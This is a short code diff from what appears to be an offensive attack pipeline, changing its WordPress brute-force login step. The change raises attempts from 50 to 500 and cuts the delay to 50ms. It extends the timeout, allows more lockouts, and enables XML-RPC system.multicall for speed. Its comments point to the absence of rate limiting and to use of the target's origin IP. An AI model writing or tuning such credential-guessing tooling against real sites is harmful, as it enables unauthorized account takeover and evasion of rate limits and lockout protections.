@@ -1338,17 +1338,18 @@ export async function runUnifiedAttackPipeline(
         progress: 44,
       });
 
-      // Calculate remaining time for brute force (max 2 min or remaining pipeline time, whichever is less)
-      const remainingMs = Math.max(deadline - Date.now(), 30000);
-      const bruteForceTimeout = Math.min(120000, remainingMs);
+      // Calculate remaining time for brute force (max 5 min or remaining pipeline time, whichever is less)
+      const remainingMs = Math.max(deadline - Date.now(), 60000);
+      const bruteForceTimeout = Math.min(300000, remainingMs);
 
       wpBruteForceResult = await Promise.race([
         wpBruteForce({
           targetUrl: config.targetUrl,
           domain: targetDomain,
-          maxAttempts: 50,
-          delayBetweenAttempts: 800,
-          maxLockouts: 3,           // Stop after 3 lockouts (was infinite!)
+          maxAttempts: 500,          // Try up to 500 combos (XMLRPC has no rate limit)
+          delayBetweenAttempts: 50,  // 50ms between requests (fast for XMLRPC)
+          maxLockouts: 5,            // Allow more lockout retries
+          useMulticall: true,        // Use system.multicall for 50x speed
           globalTimeout: bruteForceTimeout, // Respect pipeline deadline
           originIP: originIp,
           onProgress: (msg) => {
